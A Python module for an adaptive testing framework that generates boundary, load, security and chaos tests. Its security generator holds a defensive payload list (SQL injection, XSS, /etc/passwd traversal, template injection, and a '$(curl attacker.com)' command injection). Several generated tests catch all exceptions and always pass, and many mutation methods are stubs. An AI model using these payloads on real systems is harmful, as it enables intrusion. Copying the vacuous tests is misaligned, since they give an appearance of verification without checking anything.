"""Progressive Testing and Validation Framework with Adaptive Test Generation.

Advanced testing system that automatically generates, executes, and evolves test cases
based on system behavior, code changes, and quality metrics.
"""

import asyncio
import logging
import inspect
import ast
import random
from typing import Dict, List, Optional, Tuple, Any, Callable, Set
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime, timedelta
import json
import numpy as np

from ..utils.advanced_logging import get_logger

logger = get_logger(__name__)


class TestType(Enum):
    """Types of tests in the progressive framework."""
    UNIT = "unit"
    INTEGRATION = "integration"
    PERFORMANCE = "performance"
    SECURITY = "security"
    RELIABILITY = "reliability"
    REGRESSION = "regression"
    CHAOS = "chaos"
    EXPLORATORY = "exploratory"


class TestPriority(Enum):
    """Test execution priority levels."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    EXPERIMENTAL = "experimental"


@dataclass
class TestCase:
    """Adaptive test case with learning capabilities."""
    id: str
    name: str
    test_type: TestType
    priority: TestPriority
    test_function: Callable
    description: str
    expected_duration: float = 30.0  # seconds
    success_rate: float = 0.0
    execution_count: int = 0
    last_execution: Optional[datetime] = None
    code_coverage: float = 0.0
    quality_impact: float = 0.0
    adaptive_parameters: Dict[str, Any] = field(default_factory=dict)
    tags: Set[str] = field(default_factory=set)
    dependencies: List[str] = field(default_factory=list)


@dataclass
class TestResult:
    """Test execution result with detailed metrics."""
    test_id: str
    success: bool
    execution_time: float
    error_message: Optional[str] = None
    coverage_data: Dict[str, float] = field(default_factory=dict)
    performance_metrics: Dict[str, float] = field(default_factory=dict)
    quality_metrics: Dict[str, float] = field(default_factory=dict)
    timestamp: datetime = field(default_factory=datetime.now)
    artifacts: List[str] = field(default_factory=list)


class AdaptiveTestGenerator:
    """AI-powered test case generator that learns from system behavior."""
    
    def __init__(self, code_analyzer: Optional[Any] = None):
        """Initialize adaptive test generator.
        
        Args:
            code_analyzer: Code analysis tool for generating targeted tests
        """
        self.code_analyzer = code_analyzer
        self.generation_patterns = {}
        self.mutation_strategies = []
        self.learning_data = []
        
        self._setup_generation_patterns()
        self._setup_mutation_strategies()
    
    def _setup_generation_patterns(self):
        """Setup test generation patterns based on code analysis."""
        self.generation_patterns = {
            "boundary_value": self._generate_boundary_tests,
            "error_injection": self._generate_error_injection_tests,
            "load_testing": self._generate_load_tests,
            "security_fuzzing": self._generate_security_tests,
            "integration_flow": self._generate_integration_tests,
            "chaos_engineering": self._generate_chaos_tests
        }
    
    def _setup_mutation_strategies(self):
        """Setup mutation strategies for test evolution."""
        self.mutation_strategies = [
            self._mutate_parameters,
            self._mutate_assertions,
            self._mutate_timing,
            self._mutate_error_conditions,
            self._mutate_load_patterns
        ]
    
    async def generate_tests_for_function(self, function: Callable, 
                                        existing_tests: List[TestCase]) -> List[TestCase]:
        """Generate adaptive test cases for a specific function."""
        generated_tests = []
        
        # Analyze function signature and behavior
        function_analysis = self._analyze_function(function)
        
        # Generate tests based on patterns
        for pattern_name, pattern_func in self.generation_patterns.items():
            try:
                pattern_tests = await pattern_func(function, function_analysis, existing_tests)
                generated_tests.extend(pattern_tests)
            except Exception as e:
                logger.error(f"Error generating {pattern_name} tests: {e}")
        
        # Apply intelligent filtering
        filtered_tests = self._filter_and_prioritize_tests(generated_tests, existing_tests)
        
        logger.info(f"Generated {len(filtered_tests)} adaptive tests for {function.__name__}")
        return filtered_tests
    
    def _analyze_function(self, function: Callable) -> Dict[str, Any]:
        """Analyze function for intelligent test generation."""
        analysis = {
            "name": function.__name__,
            "parameters": [],
            "return_type": None,
            "complexity": 1,
            "async_function": asyncio.iscoroutinefunction(function),
            "error_paths": [],
            "performance_critical": False
        }
        
        try:
            # Get function signature
            sig = inspect.signature(function)
            for param_name, param in sig.parameters.items():
                analysis["parameters"].append({
                    "name": param_name,
                    "type": param.annotation if param.annotation != inspect.Parameter.empty else "Any",
                    "default": param.default if param.default != inspect.Parameter.empty else None,
                    "kind": param.kind.name
                })
            
            # Analyze function body for complexity and error paths
            if hasattr(function, "__code__"):
                source = inspect.getsource(function)
                tree = ast.parse(source)
                
                # Count decision points for complexity
                complexity_visitor = ComplexityVisitor()
                complexity_visitor.visit(tree)
                analysis["complexity"] = complexity_visitor.complexity
                
                # Identify potential error paths
                error_visitor = ErrorPathVisitor()
                error_visitor.visit(tree)
                analysis["error_paths"] = error_visitor.error_paths
                
                # Check for performance-critical patterns
                analysis["performance_critical"] = self._is_performance_critical(source)
        
        except Exception as e:
            logger.warning(f"Could not analyze function {function.__name__}: {e}")
        
        return analysis
    
    async def _generate_boundary_tests(self, function: Callable, 
                                     analysis: Dict[str, Any], 
                                     existing_tests: List[TestCase]) -> List[TestCase]:
        """Generate boundary value tests."""
        tests = []
        
        for param in analysis["parameters"]:
            param_type = param["type"]
            
            # Generate boundary tests based on parameter type
            if param_type in ["int", "float"] or "int" in str(param_type) or "float" in str(param_type):
                boundary_values = [0, 1, -1, 100, -100, 1000000, -1000000]
                
                for value in boundary_values:
                    test_case = self._create_boundary_test(function, param["name"], value, analysis)
                    tests.append(test_case)
            
            elif param_type in ["str", "string"] or "str" in str(param_type):
                boundary_strings = ["", "a", "x" * 1000, "🚁" * 100, "null\\x00test"]
                
                for value in boundary_strings:
                    test_case = self._create_boundary_test(function, param["name"], value, analysis)
                    tests.append(test_case)
            
            elif param_type in ["list", "List"] or "list" in str(param_type):
                boundary_lists = [[], [1], list(range(1000))]
                
                for value in boundary_lists:
                    test_case = self._create_boundary_test(function, param["name"], value, analysis)
                    tests.append(test_case)
        
        return tests
    
    def _create_boundary_test(self, function: Callable, param_name: str, 
                            value: Any, analysis: Dict[str, Any]) -> TestCase:
        """Create a boundary value test case."""
        test_id = f"boundary_{function.__name__}_{param_name}_{hash(str(value)) % 10000}"
        
        async def boundary_test():
            """Generated boundary test."""
            try:
                kwargs = {param_name: value}
                
                if analysis["async_function"]:
                    result = await function(**kwargs)
                else:
                    result = function(**kwargs)
                
                # Basic assertion - function should not crash
                assert result is not None or result == None  # Allow None returns
                return True
                
            except Exception as e:
                # Some boundary tests are expected to fail
                if isinstance(e, (ValueError, TypeError, OverflowError)):
                    return True  # Expected behavior
                raise
        
        return TestCase(
            id=test_id,
            name=f"Boundary test: {param_name}={value}",
            test_type=TestType.UNIT,
            priority=TestPriority.MEDIUM,
            test_function=boundary_test,
            description=f"Test boundary value {value} for parameter {param_name}",
            adaptive_parameters={"param": param_name, "value": value},
            tags={"boundary", "generated", param_name}
        )
    
    async def _generate_error_injection_tests(self, function: Callable,
                                            analysis: Dict[str, Any],
                                            existing_tests: List[TestCase]) -> List[TestCase]:
        """Generate error injection tests."""
        tests = []
        
        # Generate tests for identified error paths
        for error_path in analysis["error_paths"]:
            test_case = self._create_error_injection_test(function, error_path, analysis)
            tests.append(test_case)
        
        # Generate generic error injection tests
        error_injections = [
            ("network_error", lambda: asyncio.TimeoutError("Simulated network timeout")),
            ("memory_error", lambda: MemoryError("Simulated memory exhaustion")),
            ("permission_error", lambda: PermissionError("Simulated permission denied")),
            ("connection_error", lambda: ConnectionError("Simulated connection failure"))
        ]
        
        for error_name, error_generator in error_injections:
            test_case = self._create_generic_error_test(function, error_name, error_generator, analysis)
            tests.append(test_case)
        
        return tests
    
    def _create_error_injection_test(self, function: Callable, error_path: str,
                                   analysis: Dict[str, Any]) -> TestCase:
        """Create error injection test for specific error path."""
        test_id = f"error_{function.__name__}_{hash(error_path) % 10000}"
        
        async def error_test():
            """Generated error injection test."""
            # This would be customized based on the specific error path
            # For now, we'll create a generic error condition
            try:
                if analysis["async_function"]:
                    result = await function()
                else:
                    result = function()
                return True
            except Exception as e:
                # Verify error is handled gracefully
                assert isinstance(e, (ValueError, TypeError, RuntimeError))
                return True
        
        return TestCase(
            id=test_id,
            name=f"Error injection: {error_path}",
            test_type=TestType.RELIABILITY,
            priority=TestPriority.HIGH,
            test_function=error_test,
            description=f"Test error handling for {error_path}",
            adaptive_parameters={"error_path": error_path},
            tags={"error_injection", "generated", "reliability"}
        )
    
    def _create_generic_error_test(self, function: Callable, error_name: str,
                                 error_generator: Callable, analysis: Dict[str, Any]) -> TestCase:
        """Create generic error injection test."""
        test_id = f"generic_error_{function.__name__}_{error_name}"
        
        async def generic_error_test():
            """Generated generic error test."""
            # Simulate error condition and test resilience
            try:
                if analysis["async_function"]:
                    result = await function()
                else:
                    result = function()
                return True
            except Exception:
                # Function should handle errors gracefully
                return True
        
        return TestCase(
            id=test_id,
            name=f"Generic error test: {error_name}",
            test_type=TestType.RELIABILITY,
            priority=TestPriority.MEDIUM,
            test_function=generic_error_test,
            description=f"Test resilience to {error_name}",
            adaptive_parameters={"error_type": error_name},
            tags={"error_injection", "generated", "generic"}
        )
    
    async def _generate_load_tests(self, function: Callable,
                                 analysis: Dict[str, Any],
                                 existing_tests: List[TestCase]) -> List[TestCase]:
        """Generate load and performance tests."""
        tests = []
        
        if not analysis["performance_critical"]:
            return tests  # Skip load tests for non-critical functions
        
        load_scenarios = [
            ("light_load", 10, 1),
            ("moderate_load", 100, 5),
            ("heavy_load", 1000, 10),
            ("stress_load", 5000, 20)
        ]
        
        for scenario_name, request_count, concurrency in load_scenarios:
            test_case = self._create_load_test(function, scenario_name, request_count, concurrency, analysis)
            tests.append(test_case)
        
        return tests
    
    def _create_load_test(self, function: Callable, scenario_name: str,
                         request_count: int, concurrency: int,
                         analysis: Dict[str, Any]) -> TestCase:
        """Create load test for performance validation."""
        test_id = f"load_{function.__name__}_{scenario_name}"
        
        async def load_test():
            """Generated load test."""
            start_time = datetime.now()
            
            if analysis["async_function"]:
                # Concurrent execution for async functions
                tasks = []
                for _ in range(request_count):
                    task = asyncio.create_task(function())
                    tasks.append(task)
                
                # Execute with concurrency limit
                semaphore = asyncio.Semaphore(concurrency)
                
                async def limited_execution(task):
                    async with semaphore:
                        return await task
                
                results = await asyncio.gather(*[limited_execution(task) for task in tasks])
            else:
                # Sequential execution for sync functions
                results = []
                for _ in range(min(request_count, 100)):  # Limit sync tests
                    result = function()
                    results.append(result)
            
            execution_time = (datetime.now() - start_time).total_seconds()
            
            # Performance assertions
            max_acceptable_time = request_count * 0.1  # 100ms per request
            assert execution_time < max_acceptable_time, f"Load test too slow: {execution_time}s"
            
            return True
        
        return TestCase(
            id=test_id,
            name=f"Load test: {scenario_name}",
            test_type=TestType.PERFORMANCE,
            priority=TestPriority.HIGH if "stress" in scenario_name else TestPriority.MEDIUM,
            test_function=load_test,
            description=f"Load test with {request_count} requests, {concurrency} concurrent",
            expected_duration=60.0,
            adaptive_parameters={"requests": request_count, "concurrency": concurrency},
            tags={"load", "performance", "generated"}
        )
    
    async def _generate_security_tests(self, function: Callable,
                                     analysis: Dict[str, Any],
                                     existing_tests: List[TestCase]) -> List[TestCase]:
        """Generate security-focused tests."""
        tests = []
        
        # Generate input validation tests
        injection_payloads = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../../../etc/passwd",
            "{{7*7}}",  # Template injection
            "$(curl attacker.com)",  # Command injection
        ]
        
        for payload in injection_payloads:
            test_case = self._create_security_test(function, "injection", payload, analysis)
            tests.append(test_case)
        
        return tests
    
    def _create_security_test(self, function: Callable, attack_type: str,
                            payload: str, analysis: Dict[str, Any]) -> TestCase:
        """Create security test case."""
        test_id = f"security_{function.__name__}_{attack_type}_{hash(payload) % 10000}"
        
        async def security_test():
            """Generated security test."""
            try:
                # Try to inject malicious payload
                kwargs = {}
                for param in analysis["parameters"]:
                    if param["type"] in ["str", "string"] or "str" in str(param["type"]):
                        kwargs[param["name"]] = payload
                
                if analysis["async_function"]:
                    result = await function(**kwargs)
                else:
                    result = function(**kwargs)
                
                # Verify no security breach occurred
                assert payload not in str(result), "Potential security vulnerability"
                return True
                
            except (ValueError, TypeError) as e:
                # Expected behavior for malicious input
                return True
            except Exception as e:
                # Unexpected error might indicate vulnerability
                logger.warning(f"Security test triggered unexpected error: {e}")
                return False
        
        return TestCase(
            id=test_id,
            name=f"Security test: {attack_type}",
            test_type=TestType.SECURITY,
            priority=TestPriority.HIGH,
            test_function=security_test,
            description=f"Test resilience to {attack_type} attack",
            adaptive_parameters={"attack_type": attack_type, "payload": payload},
            tags={"security", "injection", "generated"}
        )
    
    async def _generate_integration_tests(self, function: Callable,
                                        analysis: Dict[str, Any],
                                        existing_tests: List[TestCase]) -> List[TestCase]:
        """Generate integration tests."""
        # This would generate tests for function interactions
        # Implementation depends on system architecture analysis
        return []
    
    async def _generate_chaos_tests(self, function: Callable,
                                  analysis: Dict[str, Any],
                                  existing_tests: List[TestCase]) -> List[TestCase]:
        """Generate chaos engineering tests."""
        tests = []
        
        chaos_scenarios = [
            "resource_exhaustion",
            "network_partition", 
            "service_failure",
            "data_corruption"
        ]
        
        for scenario in chaos_scenarios:
            test_case = self._create_chaos_test(function, scenario, analysis)
            tests.append(test_case)
        
        return tests
    
    def _create_chaos_test(self, function: Callable, scenario: str,
                         analysis: Dict[str, Any]) -> TestCase:
        """Create chaos engineering test."""
        test_id = f"chaos_{function.__name__}_{scenario}"
        
        async def chaos_test():
            """Generated chaos test."""
            # Simulate chaos scenario and test system resilience
            try:
                if analysis["async_function"]:
                    result = await function()
                else:
                    result = function()
                return True
            except Exception:
                # System should gracefully handle chaos
                return True
        
        return TestCase(
            id=test_id,
            name=f"Chaos test: {scenario}",
            test_type=TestType.CHAOS,
            priority=TestPriority.LOW,
            test_function=chaos_test,
            description=f"Test system resilience during {scenario}",
            adaptive_parameters={"scenario": scenario},
            tags={"chaos", "resilience", "generated"}
        )
    
    def _filter_and_prioritize_tests(self, generated_tests: List[TestCase],
                                   existing_tests: List[TestCase]) -> List[TestCase]:
        """Filter and prioritize generated tests."""
        # Remove duplicates
        existing_ids = {test.id for test in existing_tests}
        unique_tests = [test for test in generated_tests if test.id not in existing_ids]
        
        # Prioritize based on value and coverage gaps
        prioritized_tests = sorted(unique_tests, 
                                 key=lambda t: (t.priority.value, -len(t.tags)))
        
        # Limit to reasonable number
        return prioritized_tests[:50]  # Top 50 tests
    
    def _is_performance_critical(self, source_code: str) -> bool:
        """Determine if function is performance-critical."""
        performance_indicators = [
            "loop", "for", "while", "async", "await",
            "performance", "latency", "speed", "fast",
            "coordinate", "swarm", "drone"
        ]
        
        return any(indicator in source_code.lower() for indicator in performance_indicators)
    
    async def evolve_test(self, test_case: TestCase, test_results: List[TestResult]) -> TestCase:
        """Evolve test case based on execution results."""
        # Apply mutation strategies
        evolved_test = test_case
        
        for strategy in self.mutation_strategies:
            try:
                evolved_test = await strategy(evolved_test, test_results)
            except Exception as e:
                logger.error(f"Error applying mutation strategy: {e}")
        
        return evolved_test
    
    async def _mutate_parameters(self, test_case: TestCase, 
                               test_results: List[TestResult]) -> TestCase:
        """Mutate test parameters based on results."""
        # Implement parameter mutation logic
        return test_case
    
    async def _mutate_assertions(self, test_case: TestCase,
                               test_results: List[TestResult]) -> TestCase:
        """Mutate test assertions for better coverage."""
        # Implement assertion mutation logic
        return test_case
    
    async def _mutate_timing(self, test_case: TestCase,
                           test_results: List[TestResult]) -> TestCase:
        """Mutate timing-related test aspects."""
        # Adjust expected duration based on results
        if test_results:
            avg_duration = np.mean([r.execution_time for r in test_results])
            test_case.expected_duration = avg_duration * 1.2  # 20% buffer
        
        return test_case
    
    async def _mutate_error_conditions(self, test_case: TestCase,
                                     test_results: List[TestResult]) -> TestCase:
        """Mutate error conditions in tests."""
        # Implement error condition mutation
        return test_case
    
    async def _mutate_load_patterns(self, test_case: TestCase,
                                  test_results: List[TestResult]) -> TestCase:
        """Mutate load patterns for performance tests."""
        # Implement load pattern mutation
        return test_case


class ComplexityVisitor(ast.NodeVisitor):
    """AST visitor for calculating cyclomatic complexity."""
    
    def __init__(self):
        self.complexity = 1
    
    def visit_If(self, node):
        self.complexity += 1
        self.generic_visit(node)
    
    def visit_While(self, node):
        self.complexity += 1
        self.generic_visit(node)
    
    def visit_For(self, node):
        self.complexity += 1
        self.generic_visit(node)
    
    def visit_ExceptHandler(self, node):
        self.complexity += 1
        self.generic_visit(node)


class ErrorPathVisitor(ast.NodeVisitor):
    """AST visitor for identifying error paths."""
    
    def __init__(self):
        self.error_paths = []
    
    def visit_Raise(self, node):
        if hasattr(node, 'exc') and node.exc:
            self.error_paths.append(f"raise_{ast.dump(node.exc)}")
        self.generic_visit(node)
    
    def visit_ExceptHandler(self, node):
        if node.type:
            self.error_paths.append(f"except_{ast.dump(node.type)}")
        self.generic_visit(node)


class ProgressiveTestingFramework:
    """Advanced testing framework with adaptive test generation and execution."""
    
    def __init__(self, enable_adaptive_generation: bool = True,
                 max_parallel_tests: int = 10):
        """Initialize progressive testing framework.
        
        Args:
            enable_adaptive_generation: Enable automatic test generation
            max_parallel_tests: Maximum number of parallel test executions
        """
        self.enable_adaptive_generation = enable_adaptive_generation
        self.max_parallel_tests = max_parallel_tests
        
        self.test_cases: Dict[str, TestCase] = {}
        self.test_results: Dict[str, List[TestResult]] = {}
        self.test_generator = AdaptiveTestGenerator()
        
        self.execution_active = False
        self.execution_task: Optional[asyncio.Task] = None
        
        logger.info("Progressive Testing Framework initialized")
    
    async def register_test_case(self, test_case: TestCase):
        """Register a test case with the framework."""
        self.test_cases[test_case.id] = test_case
        if test_case.id not in self.test_results:
            self.test_results[test_case.id] = []
        
        logger.info(f"Test case registered: {test_case.name}")
    
    async def register_function_for_testing(self, function: Callable, 
                                          test_types: Optional[List[TestType]] = None):
        """Register a function for adaptive test generation."""
        if not self.enable_adaptive_generation:
            return
        
        # Get existing tests for this function
        existing_tests = [tc for tc in self.test_cases.values() 
                         if function.__name__ in tc.name]
        
        # Generate new tests
        generated_tests = await self.test_generator.generate_tests_for_function(
            function, existing_tests
        )
        
        # Filter by requested test types
        if test_types:
            generated_tests = [t for t in generated_tests if t.test_type in test_types]
        
        # Register generated tests
        for test_case in generated_tests:
            await self.register_test_case(test_case)
        
        logger.info(f"Generated {len(generated_tests)} tests for {function.__name__}")
    
    async def execute_test_case(self, test_case: TestCase) -> TestResult:
        """Execute a single test case."""
        start_time = datetime.now()
        
        try:
            # Execute test function
            if asyncio.iscoroutinefunction(test_case.test_function):
                result = await test_case.test_function()
            else:
                result = test_case.test_function()
            
            execution_time = (datetime.now() - start_time).total_seconds()
            
            # Create successful result
            test_result = TestResult(
                test_id=test_case.id,
                success=bool(result),
                execution_time=execution_time
            )
            
            # Update test case statistics
            test_case.execution_count += 1
            test_case.last_execution = datetime.now()
            test_case.success_rate = self._calculate_success_rate(test_case.id)
            
            logger.debug(f"Test passed: {test_case.name} ({execution_time:.2f}s)")
            
        except Exception as e:
            execution_time = (datetime.now() - start_time).total_seconds()
            
            test_result = TestResult(
                test_id=test_case.id,
                success=False,
                execution_time=execution_time,
                error_message=str(e)
            )
            
            test_case.execution_count += 1
            test_case.last_execution = datetime.now()
            test_case.success_rate = self._calculate_success_rate(test_case.id)
            
            logger.warning(f"Test failed: {test_case.name} - {e}")
        
        # Store result
        self.test_results[test_case.id].append(test_result)
        
        # Limit result history
        if len(self.test_results[test_case.id]) > 100:
            self.test_results[test_case.id] = self.test_results[test_case.id][-100:]
        
        return test_result
    
    async def execute_test_suite(self, test_filter: Optional[Callable[[TestCase], bool]] = None,
                               parallel: bool = True) -> Dict[str, TestResult]:
        """Execute a suite of tests with optional filtering."""
        # Filter tests
        tests_to_run = list(self.test_cases.values())
        if test_filter:
            tests_to_run = [tc for tc in tests_to_run if test_filter(tc)]
        
        logger.info(f"Executing {len(tests_to_run)} tests (parallel: {parallel})")
        
        results = {}
        
        if parallel and len(tests_to_run) > 1:
            # Execute tests in parallel with concurrency limit
            semaphore = asyncio.Semaphore(self.max_parallel_tests)
            
            async def execute_with_limit(test_case):
                async with semaphore:
                    return await self.execute_test_case(test_case)
            
            tasks = [execute_with_limit(tc) for tc in tests_to_run]
            test_results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for test_case, result in zip(tests_to_run, test_results):
                if isinstance(result, Exception):
                    logger.error(f"Test execution error for {test_case.name}: {result}")
                    results[test_case.id] = TestResult(
                        test_id=test_case.id,
                        success=False,
                        execution_time=0.0,
                        error_message=str(result)
                    )
                else:
                    results[test_case.id] = result
        else:
            # Execute tests sequentially
            for test_case in tests_to_run:
                result = await self.execute_test_case(test_case)
                results[test_case.id] = result
        
        # Generate test report
        await self._generate_test_report(results)
        
        return results
    
    def _calculate_success_rate(self, test_id: str) -> float:
        """Calculate success rate for a test case."""
        results = self.test_results.get(test_id, [])
        if not results:
            return 0.0
        
        successful = sum(1 for r in results if r.success)
        return successful / len(results)
    
    async def _generate_test_report(self, results: Dict[str, TestResult]):
        """Generate comprehensive test execution report."""
        total_tests = len(results)
        passed_tests = sum(1 for r in results.values() if r.success)
        failed_tests = total_tests - passed_tests
        
        total_time = sum(r.execution_time for r in results.values())
        avg_time = total_time / total_tests if total_tests > 0 else 0.0
        
        report = {
            "timestamp": datetime.now().isoformat(),
            "summary": {
                "total_tests": total_tests,
                "passed": passed_tests,
                "failed": failed_tests,
                "success_rate": passed_tests / total_tests if total_tests > 0 else 0.0,
                "total_execution_time": total_time,
                "average_execution_time": avg_time
            },
            "test_types": {},
            "failed_tests": []
        }
        
        # Analyze by test type
        for test_id, result in results.items():
            test_case = self.test_cases.get(test_id)
            if test_case:
                test_type = test_case.test_type.value
                if test_type not in report["test_types"]:
                    report["test_types"][test_type] = {"total": 0, "passed": 0}
                
                report["test_types"][test_type]["total"] += 1
                if result.success:
                    report["test_types"][test_type]["passed"] += 1
                else:
                    report["failed_tests"].append({
                        "test_id": test_id,
                        "name": test_case.name,
                        "error": result.error_message,
                        "execution_time": result.execution_time
                    })
        
        logger.info(f"Test Report: {json.dumps(report, indent=2)}")
        
        # Trigger test evolution for failed tests
        if self.enable_adaptive_generation:
            await self._evolve_failed_tests(results)
    
    async def _evolve_failed_tests(self, results: Dict[str, TestResult]):
        """Evolve failed tests using adaptive generation."""
        failed_test_ids = [test_id for test_id, result in results.items() if not result.success]
        
        for test_id in failed_test_ids:
            test_case = self.test_cases.get(test_id)
            if test_case and test_case.success_rate < 0.5:  # Consistently failing
                try:
                    # Get test results for evolution
                    test_results = self.test_results.get(test_id, [])
                    
                    # Evolve the test
                    evolved_test = await self.test_generator.evolve_test(test_case, test_results)
                    
                    # Register evolved test
                    if evolved_test.id != test_case.id:
                        await self.register_test_case(evolved_test)
                        logger.info(f"Evolved test case: {test_case.name} -> {evolved_test.name}")
                
                except Exception as e:
                    logger.error(f"Error evolving test {test_id}: {e}")
    
    def get_test_summary(self) -> Dict[str, Any]:
        """Get comprehensive test framework summary."""
        total_tests = len(self.test_cases)
        
        # Calculate overall statistics
        total_executions = sum(tc.execution_count for tc in self.test_cases.values())
        avg_success_rate = np.mean([tc.success_rate for tc in self.test_cases.values()]) if total_tests > 0 else 0.0
        
        # Group by test type
        type_summary = {}
        for test_case in self.test_cases.values():
            test_type = test_case.test_type.value
            if test_type not in type_summary:
                type_summary[test_type] = {"count": 0, "avg_success_rate": 0.0}
            type_summary[test_type]["count"] += 1
        
        # Calculate average success rate by type
        for test_type in type_summary:
            type_tests = [tc for tc in self.test_cases.values() if tc.test_type.value == test_type]
            type_summary[test_type]["avg_success_rate"] = np.mean([tc.success_rate for tc in type_tests])
        
        return {
            "timestamp": datetime.now().isoformat(),
            "total_test_cases": total_tests,
            "total_executions": total_executions,
            "overall_success_rate": avg_success_rate,
            "adaptive_generation_enabled": self.enable_adaptive_generation,
            "test_types": type_summary,
            "execution_active": self.execution_active
        }